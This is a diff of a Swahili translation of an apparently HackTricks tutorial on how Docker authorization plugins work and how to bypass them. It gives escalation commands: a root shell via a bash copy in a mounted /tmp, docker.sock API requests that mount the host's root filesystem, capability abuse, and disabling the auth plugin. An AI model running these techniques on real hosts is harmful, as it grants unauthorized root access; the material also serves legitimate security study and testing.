@@ -14,31 +14,31 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 {% endhint %}
 
 
-Mfumo wa **idhini** wa **Docker** wa nje ya sanduku ni **kila kitu au hakuna kitu**. Mtumiaji yeyote mwenye ruhusa ya kufikia **Docker daemon** anaweza **kufanya** amri yoyote ya mteja wa Docker. Hali hiyo hiyo inatumika kwa wito wanaotumia API ya Injini ya Docker kuwasiliana na daemon. Ikiwa unahitaji **udhibiti wa ufikiaji** zaidi, unaweza kuunda **vijitendo vya idhini** na kuviweka kwenye usanidi wa **Docker daemon** yako. Kwa kutumia kijitendo cha idhini, msimamizi wa Docker anaweza **kuunda sera za ufikiaji** za kina kwa ajili ya kusimamia ufikiaji wa **Docker daemon**.
+Mfumo wa **idhini** wa **Docker** wa nje ya sanduku ni **kila kitu au chochote**. Mtumiaji yeyote mwenye ruhusa ya kufikia **Docker daemon** anaweza **kufanya** amri yoyote ya mteja wa Docker. Hali hiyo hiyo inatumika kwa wito wanaotumia API ya Injini ya Docker kuwasiliana na daemon. Ikiwa unahitaji **udhibiti wa ufikiaji** zaidi, unaweza kuunda **vijitendo vya idhini** na kuviweka kwenye usanidi wa **Docker daemon** yako. Kwa kutumia kijitendo cha idhini, msimamizi wa Docker anaweza **kuunda sera za ufikiaji** za kina kwa ajili ya kusimamia ufikiaji wa **Docker daemon**.
 
 # Msingi wa usanifu
 
-Vijitendo vya Docker Auth ni **vijitendo vya nje** ambavyo unaweza kutumia **kuruhusu/kukataa** **vitendo** vinavyotakiwa kwa **Docker Daemon** **kulingana** na **mtumiaji** aliyeomba na **kitendo** **kilichotakiwa**.
+Vijitendo vya Docker Auth ni **vijitendo vya nje** ambavyo unaweza kutumia **kuruhusu/kukataa** **vitendo** vinavyotakiwa kwa **Docker Daemon** **kulingana** na **mtumiaji** aliyeyataka na **kitendo** **kilichotakiwa**.
 
-**[Taarifa ifuatayo ni kutoka kwenye nyaraka](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
+**[Taarifa ifuatayo ni kutoka kwenye docs](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-Wakati **ombio la HTTP** linapofanywa kwa **daemon** ya Docker kupitia CLI au kupitia API ya Injini, **safu ya uthibitishaji** inapeleka ombi kwa **kijitendo** cha **uthibitishaji** kilichosakinishwa. Ombi lina mtumiaji (mwanakitu) na muktadha wa amri. **Kijitendo** kina jukumu la kuamua ikiwa ruhusa itatolewa au kukataliwa.
+Wakati **ombio la HTTP** linapofanywa kwa **daemon** ya Docker kupitia CLI au kupitia API ya Injini, **safu ya uthibitishaji** **inasafirisha** ombi kwa **kijitendo** cha **uthibitishaji** kilichosakinishwa. Ombi lina mtumiaji (mwanakitu) na muktadha wa amri. **Kijitendo** kina jukumu la kuamua ikiwa **kuruhusu** au **kukataa** ombi.
 
-Mchoro wa mfuatano hapa chini unaonyesha mtiririko wa ruhusa na kukataa:
+Mchoro wa mfuatano hapa chini unaonyesha mtiririko wa idhini ya kuruhusu na kukataa:
 
 ![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)
 
 ![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)
 
-Kila ombi lililotumwa kwa kijitendo **linajumuisha mtumiaji aliyeidhinishwa, vichwa vya HTTP, na mwili wa ombi/jibu**. Ni **jina la mtumiaji** tu na **njia ya uthibitishaji** iliyotumika inayotumwa kwa kijitendo. Muhimu zaidi, **hakuna** akidi za mtumiaji au token zinazotumwa. Mwishowe, **sio kila mwili wa ombi/jibu unatumwa** kwa kijitendo cha idhini. Ni wale tu mwili wa ombi/jibu ambapo `Content-Type` ni `text/*` au `application/json` ndio unatumwa.
+Kila ombi lililotumwa kwa kijitendo **linajumuisha mtumiaji aliyeidhinishwa, vichwa vya HTTP, na mwili wa ombi/jibu**. Ni **jina la mtumiaji** tu na **mbinu ya uthibitishaji** iliyotumika inayosafirishwa kwa kijitendo. Muhimu zaidi, **hakuna** akidi za mtumiaji **au** tokeni zinazotumwa. Mwishowe, **sio kila mwili wa ombi/jibu unatumwa** kwa kijitendo cha idhini. Ni wale tu mwili wa ombi/jibu ambapo `Content-Type` ni `text/*` au `application/json` ndio wanaotumwa.
 
-Kwa amri ambazo zinaweza kuweza kuingilia uhusiano wa HTTP (`HTTP Upgrade`), kama vile `exec`, kijitendo cha idhini kinaitwa tu kwa ombi la awali la HTTP. Mara kijitendo kinapokubali amri, idhini haitumiki kwa mtiririko wa baadaye. Kwa hakika, data ya mtiririko haitatumwa kwa vijitendo vya idhini. Kwa amri ambazo zinarejesha jibu la HTTP lililokatwa, kama vile `logs` na `events`, ombi la HTTP pekee ndilo linalotumwa kwa vijitendo vya idhini.
+Kwa amri ambazo zinaweza kuweza kuingilia uhusiano wa HTTP (`HTTP Upgrade`), kama vile `exec`, kijitendo cha idhini kinaitwa tu kwa ombi la awali la HTTP. Mara kijitendo kinapokubali amri, idhini haitumiki kwa mtiririko wa mabaki. Kwa haswa, data ya mtiririko haitasafirishwa kwa vijitendo vya idhini. Kwa amri ambazo zinarejesha jibu la HTTP lililokatwa, kama vile `logs` na `events`, ombi la HTTP pekee ndilo linalotumwa kwa vijitendo vya idhini.
 
 Wakati wa usindikaji wa ombi/jibu, mtiririko fulani wa idhini unaweza kuhitaji kufanya maswali ya ziada kwa **Docker daemon**. Ili kukamilisha mtiririko kama huo, vijitendo vinaweza kuita API ya daemon kama mtumiaji wa kawaida. Ili kuwezesha maswali haya ya ziada, kijitendo lazima kitoe njia kwa msimamizi kuunda sera sahihi za uthibitishaji na usalama.
 
-## Vijitendo Kadhaa
+## Vijitendo Vingi
 
-Wewe ni wajibu wa **kujiandikisha** kijitendo chako kama sehemu ya **kuanzisha** **Docker daemon**. Unaweza kusakinisha **vijitendo vingi na kuviunganisha pamoja**. Mnyororo huu unaweza kuagizwa. Kila ombi kwa daemon hupita kwa mpangilio kupitia mnyororo. Ni tu wakati **vijitendo vyote vinapotoa ufikiaji** kwa rasilimali, ndipo ufikiaji unapotolewa.
+Unawajibika kwa **kujiandikisha** kijitendo chako kama sehemu ya **kuanzisha** **Docker daemon**. Unaweza kusakinisha **vijitendo vingi na kuviunganisha pamoja**. Mnyororo huu unaweza kuagizwa. Kila ombi kwa daemon hupita kwa mpangilio kupitia mnyororo. Ni wakati tu **vijitendo vyote vinapotoa ufikiaji** kwa rasilimali, ndipo ufikiaji unatolewa.
 
 # Mifano ya Kijitendo
 
@@ -64,7 +64,7 @@ Mambo makuu ya kuangalia ni **ni vipi endpoints zinazoruhusiwa** na **ni vipi th
 
 Ili kufanya kuorodhesha hii unaweza **kutumia chombo** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**
 
-## kukataliwa `run --privileged`
+## kukataa `run --privileged`
 
 ### Haki za chini kabisa
 ```bash
@@ -94,7 +94,7 @@ Sasa, mtumiaji anaweza kutoroka kutoka kwenye kontena akitumia yoyote ya [**mbin
 
 ## Mount Writable Folder
 
-Katika kesi hii, sysadmin **amekataza watumiaji kuendesha kontena na bendera ya `--privileged`** au kutoa uwezo wowote wa ziada kwa kontena, na aliruhusu tu kuunganisha folda ya `/tmp`:
+Katika kesi hii, sysadmin **amezuia watumiaji kuendesha kontena na bendera ya `--privileged`** au kutoa uwezo wowote wa ziada kwa kontena, na aliruhusu tu kuunganisha folda ya `/tmp`:
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
@@ -104,16 +104,16 @@ host> /tmp/bash
 -p #This will give you a shell as root
 ```
 {% hint style="info" %}
-Kumbuka kwamba huenda usiweze kuunganisha folda `/tmp` lakini unaweza kuunganisha **folda nyingine inayoweza kuandikwa**. Unaweza kupata directories zinazoweza kuandikwa kwa kutumia: `find / -writable -type d 2>/dev/null`
+Kumbuka kwamba huenda usiweze kuunganisha folda `/tmp` lakini unaweza kuunganisha **folda nyingine inayoweza kuandikwa**. Unaweza kupata saraka zinazoweza kuandikwa kwa kutumia: `find / -writable -type d 2>/dev/null`
 
-**Kumbuka kwamba si directories zote katika mashine ya linux zitasaidia suid bit!** Ili kuangalia ni directories zipi zinazosupport suid bit, endesha `mount | grep -v "nosuid"` Kwa mfano, kawaida `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` na `/var/lib/lxcfs` hazisaidii suid bit.
+**Kumbuka kwamba si saraka zote katika mashine ya linux zitasaidia kipande cha suid!** Ili kuangalia ni saraka zipi zinazosupport kipande cha suid, endesha `mount | grep -v "nosuid"` Kwa mfano, kawaida `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` na `/var/lib/lxcfs` hazisaidii kipande cha suid.
 
-Kumbuka pia kwamba ikiwa unaweza **kuunganisha `/etc`** au folda nyingine yoyote **iliyokuwa na faili za usanidi**, unaweza kuzibadilisha kutoka kwenye kontena la docker kama root ili **uzitumie kwenye mwenyeji** na kupandisha mamlaka (huenda ukabadilisha `/etc/shadow`)
+Kumbuka pia kwamba ikiwa unaweza **kuunganisha `/etc`** au folda nyingine yoyote **iliyokuwa na faili za usanidi**, unaweza kuzibadilisha kutoka kwenye kontena la docker kama root ili **uzitumie vibaya kwenye mwenyeji** na kupandisha mamlaka (huenda ukibadilisha `/etc/shadow`)
 {% endhint %}
 
 ## Kipengele cha API Kisichokaguliwa
 
-Wajibu wa sysadmin anayekamilisha plugin hii ni kudhibiti ni vitendo vipi na kwa mamlaka gani kila mtumiaji anaweza kufanya. Hivyo, ikiwa admin atachukua njia ya **blacklist** na viwango na sifa, huenda **akasahau baadhi yao** ambayo yanaweza kumruhusu mshambuliaji **kupandisha mamlaka.**
+Wajibu wa sysadmin anayekamilisha plugin hii ni kudhibiti ni vitendo vipi na ni mamlaka gani kila mtumiaji anaweza kutekeleza. Hivyo, ikiwa admin atachukua mbinu ya **blacklist** na viwango na sifa, huenda **akasahau baadhi yao** ambazo zinaweza kumruhusu mshambuliaji **kupandisha mamlaka.**
 
 Unaweza kuangalia API ya docker katika [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
 
@@ -121,8 +121,8 @@ Unaweza kuangalia API ya docker katika [https://docs.docker.com/engine/api/v1.40
 
 ### Binds katika root
 
-Inawezekana kwamba wakati sysadmin alikamilisha firewall ya docker alisahau kuhusu **parameta muhimu** ya [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kama "**Binds**".\
-Katika mfano ufuatao inawezekana kutumia makosa haya kuunda na kuendesha kontena linalounganisha folda ya root (/) ya mwenyeji:
+Inawezekana kwamba wakati sysadmin alikamilisha firewall ya docker alikumbuka **kuhusu parameter muhimu** ya [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kama "**Binds**".\
+Katika mfano ufuatao inawezekana kutumia vibaya makosa haya kuunda na kuendesha kontena linalounganisha folda ya root (/) ya mwenyeji:
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -138,13 +138,13 @@ Kumbuka jinsi katika mfano huu tunatumia **`Binds`** param kama ufunguo wa kiwan
 
 ### Binds katika HostConfig
 
-Fuata maelekezo sawa na **Binds katika root** ukifanya hii **ombio** kwa Docker API:
+Fuata maelekezo sawa na **Binds katika root** ukifanya **ombio** hii kwa Docker API:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
 ### Mounts in root
 
-Fuata maelekezo sawa na yale ya **Binds in root** ukifanya **ombile** hili kwa API ya Docker:
+Fuata maelekezo sawa na yale ya **Binds in root** ukifanya **ombile** hili kwa Docker API:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
@@ -167,12 +167,12 @@ capsh --print
 #You can abuse the SYS_MODULE capability
 ```
 {% hint style="info" %}
-**`HostConfig`** ni ufunguo ambao mara nyingi unashikilia **privileges** **za kuvutia** za kutoroka kutoka kwenye kontena. Hata hivyo, kama tulivyozungumzia hapo awali, zingatia jinsi matumizi ya Binds nje yake pia yanavyofanya kazi na yanaweza kukuruhusu kupita vizuizi.
+**`HostConfig`** ni ufunguo ambao mara nyingi unashikilia **privileges** **za kuvutia** za kutoroka kutoka kwenye kontena. Hata hivyo, kama tulivyozungumzia hapo awali, kumbuka jinsi kutumia Binds nje yake pia kunafanya kazi na kunaweza kukuruhusu kupita vizuizi.
 {% endhint %}
 
 ## Kuondoa Plugin
 
-Ikiwa **sysadmin** **alipokosa** **kuzuia** uwezo wa **kuondoa** **plugin**, unaweza kutumia hii kuondoa kabisa!
+Ikiwa **sysadmin** **alisahau** **kuzuia** uwezo wa **kuondoa** **plugin**, unaweza kutumia hii kuondoa kabisa!
 ```bash
 docker plugin list #Enumerate plugins
 
@@ -184,9 +184,9 @@ docker plugin disable authobot
 docker run --rm -it --privileged -v /:/host ubuntu bash
 docker plugin enable authobot
 ```
-Kumbuka **kurejesha plugin baada ya kupandisha hadhi**, au **kuanzisha tena huduma ya docker hakutafanya kazi**!
+Kumbuka ku **re-enable plugin baada ya kupandisha hadhi**, au **kuanzisha tena huduma ya docker hakutafanya kazi**!
 
-## Mwandiko wa Bypass ya Auth Plugin
+## Maktaba ya Bypass ya Auth Plugin
 
 * [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
@@ -199,7 +199,7 @@ Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt
 <summary>Support HackTricks</summary>
 
 * Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
